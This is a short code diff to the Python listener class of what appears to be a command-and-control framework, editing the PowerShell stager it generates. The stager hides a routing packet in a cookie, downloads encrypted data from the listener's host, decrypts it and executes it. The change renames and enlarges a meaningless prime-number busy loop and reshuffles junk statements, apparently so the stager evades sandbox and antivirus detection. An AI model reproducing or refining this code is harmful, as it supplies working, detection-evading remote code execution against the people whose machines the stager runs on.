@@ -357,15 +357,16 @@ class Listener:
 
             # add the RC4 packet to a cookie
             stager += f'$talk.Headers.Add("Cookie","{ cookie }={ b64RoutingPacket.decode("UTF-8") }");'
+            stager += "0..300 | ForEach-Object { $t12=$_+$T12 };"
+
             stager += "$mdata=$talk.DownloadData($hom+$t);"
             stager += "$iv=$mdata[0..3];$mdata=$mdata[4..$mdata.length];"
             
-            stager += "0..300 | ForEach-Object { $t12=$_+$T12 };"
+            stager += "function Perform-PrimeCheck { $maxNumber = 300000; $primes = @(); for ($i = 2; $i -le $maxNumber; $i++) { $isPrime = $true; for ($j = 2; $j -le [math]::Sqrt($i); $j++) { if ($i % $j -eq 0) { $isPrime = $false; break } }; if ($isPrime) { $primes += $i } } };"
 
             # decode everything and kick it over to IEX to kick off execution
             stager += "$t5 = -join[Char[]](& $M $mdata ($IV+$Kk));"
-            stager += "function Perform-HeavyComputation { $maxNumber = 100000; $primes = @(); for ($i = 2; $i -le $maxNumber; $i++) { $isPrime = $true; for ($j = 2; $j -le [math]::Sqrt($i); $j++) { if ($i % $j -eq 0) { $isPrime = $false; break } }; if ($isPrime) { $primes += $i } } };"
-            stager += "Perform-HeavyComputation; goForIT $T5;"
+            stager += "Perform-PrimeCheck; goForIT $T5;"
 
             # Remove comments and make one line
             stager = helpers.strip_powershell_comments(stager)
